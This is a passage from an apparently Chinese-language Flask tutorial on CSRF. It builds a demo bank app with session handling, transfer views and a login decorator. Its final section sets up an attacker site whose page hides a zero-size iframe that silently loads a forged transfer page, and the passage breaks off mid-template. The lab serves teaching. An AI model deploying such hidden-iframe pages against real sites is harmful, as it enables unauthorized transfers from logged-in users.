class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token keyword">from</span> flask_session <span class="token keyword">import</span> Session <span class="token keyword">as</span> FsessionFsession<span class="token punctuation">(</span>app<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登录账户后,查看<code>redis</code> ,有<code>session</code>开头的数据,说明成功.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-16/1602852453911-10317.png" alt="10317"></p></blockquote><h4 id="10-修改存钱和转账页面"><a href="#10-修改存钱和转账页面" class="headerlink" title="10.修改存钱和转账页面"></a>10.修改存钱和转账页面</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token comment" spellcheck="true"># 存钱页面</span><span class="token keyword">class</span> <span class="token class-name">SaveMoneyView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'savemoney.html'</span><span class="token punctuation">,</span> user<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       form <span class="token operator">=</span> SaveMoneyForm<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token comment" spellcheck="true"># 如果表单验证成功,则去session中查看 username</span>           <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>               add_money <span class="token operator">=</span> form<span class="token punctuation">.</span>add_money<span class="token punctuation">.</span>data               true_user <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>BankUsers<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>username <span class="token operator">==</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>               true_user<span class="token punctuation">.</span>balance <span class="token operator">+=</span> add_money               db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'personal'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">'转账成功'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token keyword">else</span><span class="token punctuation">:</span>               <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'savemoney.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">'请输入正确的金额'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 转账页面</span><span class="token keyword">class</span> <span class="token class-name">TransferView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'transfer.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       form <span class="token operator">=</span> TransferForm<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token comment" spellcheck="true"># 表单验证成功后,转入验证session</span>           <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>               money <span class="token operator">=</span> form<span class="token punctuation">.</span>transfer<span class="token punctuation">.</span>data                transfer_name <span class="token operator">=</span> form<span class="token punctuation">.</span>transfer_name<span class="token punctuation">.</span>data               username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>               true_user <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>BankUsers<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>username <span class="token operator">==</span> username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true"># 判断金额是否符合逻辑</span>               <span class="token keyword">if</span> true_user<span class="token punctuation">.</span>balance <span class="token operator">>=</span> money<span class="token punctuation">:</span>                   true_user<span class="token punctuation">.</span>balance <span class="token operator">-=</span> money                   <span class="token comment" spellcheck="true"># 转账账户</span>                   transfer_user <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>BankUsers<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>username <span class="token operator">==</span> transfer_name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>                   transfer_user<span class="token punctuation">.</span>balance <span class="token operator">+=</span> money                   <span class="token comment" spellcheck="true"># 提交事务</span>                   db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                   <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'personal'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">'转账成功'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token keyword">else</span><span class="token punctuation">:</span>                   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'transfer.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">'余额不足'</span><span class="token punctuation">)</span>           <span class="token keyword">else</span><span class="token punctuation">:</span>               <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'transfer.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span>form<span class="token punctuation">.</span>errors<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 退出</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token triple-quoted-string string">"""删除session"""</span>   session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意,以上建立在确实有<code>session</code>的情况下.</p><p>验证:注册2个账户,并发起转账操作,查看数据库中数据是否发生变化.</p><pre class="line-numbers language-sql"><code class="language-sql">mysql root<span class="token variable">@192.168.0.101</span>:flask_csrf_demo<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> bankusers<span class="token punctuation">;</span>       <span class="token operator">+</span><span class="token comment" spellcheck="true">----+----------------------+------------+------------+-------------+---------+</span><span class="token operator">|</span> id <span class="token operator">|</span> email                <span class="token operator">|</span> username   <span class="token operator">|</span> password   <span class="token operator">|</span> phone       <span class="token operator">|</span> balance <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+----------------------+------------+------------+-------------+---------+</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> ningwenyan<span class="token variable">@qq.com</span>    <span class="token operator">|</span> ningwenyan <span class="token operator">|</span> <span class="token number">123456789</span>  <span class="token operator">|</span> <span class="token number">18518506688</span> <span class="token operator">|</span>    <span class="token number">9000.0</span>  <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token operator">|</span> mytestuser<span class="token variable">@qq.com</span>    <span class="token operator">|</span> mytestuser <span class="token operator">|</span> <span class="token number">123456789</span>  <span class="token operator">|</span> <span class="token number">18518506688</span> <span class="token operator">|</span> <span class="token number">1000.0</span>  <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+----------------------+------------+------------+-------------+---------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="11-限制未登录用户"><a href="#11-限制未登录用户" class="headerlink" title="11.限制未登录用户"></a>11.限制未登录用户</h4><blockquote><p>现在已经实现了登录的账户访问的页面的基本情况,但是还有一种情况,那就是没有注册过的 账户, 如果知道<code>URL</code>,也会访问到<code>savemoney.html\transfer.html</code>页面,为了避免这种情况,我们需要做出限制,让没有登录的账户不能访问我们的相关页面.</p><p>在<code>views.MethodView</code>中有一个<code>decorators</code>的功能,可以起到装饰器的作用,可以把验证的函数放在这个里面</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> flask <span class="token keyword">import</span> views<span class="token operator">>></span><span class="token operator">></span> help<span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">.</span>decorator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># limit.py</span><span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps<span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>session<span class="token keyword">def</span> <span class="token function">limit_session</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>   @wraps<span class="token punctuation">(</span>func<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>       username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span>None<span class="token punctuation">)</span>       <span class="token keyword">if</span> username<span class="token punctuation">:</span>           <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> wrapper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token comment" spellcheck="true"># 存钱页面</span><span class="token keyword">class</span> <span class="token class-name">SaveMoneyView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span>   decorators <span class="token operator">=</span> <span class="token punctuation">[</span>limit_session<span class="token punctuation">]</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'savemoney.html'</span><span class="token punctuation">,</span> user<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       form <span class="token operator">=</span> SaveMoneyForm<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token comment" spellcheck="true"># 如果表单验证成功,则去session中查看 username</span>           <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>               add_money <span class="token operator">=</span> form<span class="token punctuation">.</span>add_money<span class="token punctuation">.</span>data               true_user <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>BankUsers<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>username <span class="token operator">==</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>               true_user<span class="token punctuation">.</span>balance <span class="token operator">+=</span> add_money               db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'personal'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">'转账成功'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token keyword">else</span><span class="token punctuation">:</span>               <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'savemoney.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">'请输入正确的金额'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 转账页面</span><span class="token keyword">class</span> <span class="token class-name">TransferView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span>   decorators <span class="token operator">=</span> <span class="token punctuation">[</span>limit_session<span class="token punctuation">]</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'transfer.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       form <span class="token operator">=</span> TransferForm<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token comment" spellcheck="true"># 表单验证成功后,转入验证session</span>           <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>               money <span class="token operator">=</span> form<span class="token punctuation">.</span>transfer<span class="token punctuation">.</span>data                transfer_name <span class="token operator">=</span> form<span class="token punctuation">.</span>transfer_name<span class="token punctuation">.</span>data               username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>               true_user <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>BankUsers<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>username <span class="token operator">==</span> username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true"># 判断金额是否符合逻辑</span>               <span class="token keyword">if</span> true_user<span class="token punctuation">.</span>balance <span class="token operator">>=</span> money<span class="token punctuation">:</span>                   true_user<span class="token punctuation">.</span>balance <span class="token operator">-=</span> money                   <span class="token comment" spellcheck="true"># 转账账户</span>                   transfer_user <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>BankUsers<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>username <span class="token operator">==</span> transfer_name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>                   transfer_user<span class="token punctuation">.</span>balance <span class="token operator">+=</span> money                   <span class="token comment" spellcheck="true"># 提交事务</span>                   db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                   <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'personal'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">'转账成功'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token keyword">else</span><span class="token punctuation">:</span>                   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'transfer.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">'余额不足'</span><span class="token punctuation">)</span>           <span class="token keyword">else</span><span class="token punctuation">:</span>               <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'transfer.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span>form<span class="token punctuation">.</span>errors<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们删除<code>cookie</code>后,再次访问<code>savemoney.html\transfer.html</code>页面, 会自动跳转到登录页面.这样保障了数据的安全.</p></blockquote><h3 id="3-攻击实例-evel-website-com"><a href="#3-攻击实例-evel-website-com" class="headerlink" title="3.攻击实例(evel.website.com)"></a>3.攻击实例(evel.website.com)</h3><blockquote><p>初始化项目,这里使用的是<code>JavaScript</code> 控制黑客网站主动去发送已经登录银行用户的<code>cookie</code> 信息.实现转账.</p><pre class="line-numbers language-base"><code class="language-base">├── app.py      # 主文件├── config.py     # 配置文件├── static              # css,js文件│   └── images│       └── 10001.gif└── templates     # 渲染文件 ├── index.html      # 主页 └── transfer.html     # 转账页面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>app.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token keyword">import</span> configapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/transfer/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'transfer.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.0.101'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>config.py</code></p><pre class="line-numbers language-python"><code class="language-python">DEBUG<span class="token operator">=</span><span class="token boolean">True</span>TEMPLATES_AUTO_RELOAD<span class="token operator">=</span><span class="token boolean">True</span>SERVER_NAME<span class="token operator">=</span><span class="token string">"www.evel_website.com:8080"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>index.html</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">     <span class="token selector"><span class="token class">.box</span> </span><span class="token punctuation">{</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>images/10001.gif<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>transfer<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里引入了一个<code>iframe</code> 内联浏览器标签,并把高宽设置为<code>0</code> ,实现了隐藏的任务,这样,访问主页会自动运行<code>iframe</code> 标签,跳转到转账页面.</p><p><code>transfer.html</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token 